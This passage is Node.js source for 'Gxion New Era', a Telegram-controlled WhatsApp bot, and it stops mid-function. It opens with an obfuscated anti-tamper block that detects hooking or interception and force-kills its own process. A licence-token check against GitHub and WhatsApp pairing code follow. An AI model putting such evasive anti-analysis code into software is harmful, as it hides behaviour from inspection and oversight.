 ///CREDIT BASE BY AMBALABU 
/// NO HAPUS CREDIT 
(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const https = require("https");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@otaxayuns/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function runtime(seconds) {
  seconds = Number(seconds);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function memory() {
  return (process.memoryUsage().rss / 1024 / 1024).toFixed(0) + " MB";
}
// ================= SECURITY =================//

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Unbandfoul/gxion/refs/heads/main/tokens.json";////ganti jadi Raw luh



async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

if (!validTokens.length) {
  console.log(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @Bawzhhh
☇ Name Script : Gxion New Era
☇ System : Auto Update

❌ Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
`);
  process.exit(1);
}

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(""));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token valid"));
  startBot();
}

function startBot() {
  console.log(chalk.red(`⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @Bawzhhh
☇ Name Script : Gxion New Era
☇ System : Auto Update
  
  Bot Berhasil Terhubung System Deteksi Bypass Akan Di Lepas Secara Otomatis`))
}

validateToken()

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @Bawzhhh
☇ Name Script : Gxion New Era
☇ System : Auto Update
☇ Bot Connect
`);

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @Bawzhhh
☇ Name Script : Gxion New Era
☇ System : Auto Update
☇ Bot Connect
☇ WhatsApp Number : ${linkedWhatsAppNumber}
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`<blockquote>☾. ⬡═―⊱「 𝑮𝑿𝑰𝑶𝑵 」⊰―═⬡ ࣪ ִֶָ☾.
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ    Number : ${linkedWhatsAppNumber}
ϟ    Status : Connected
`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
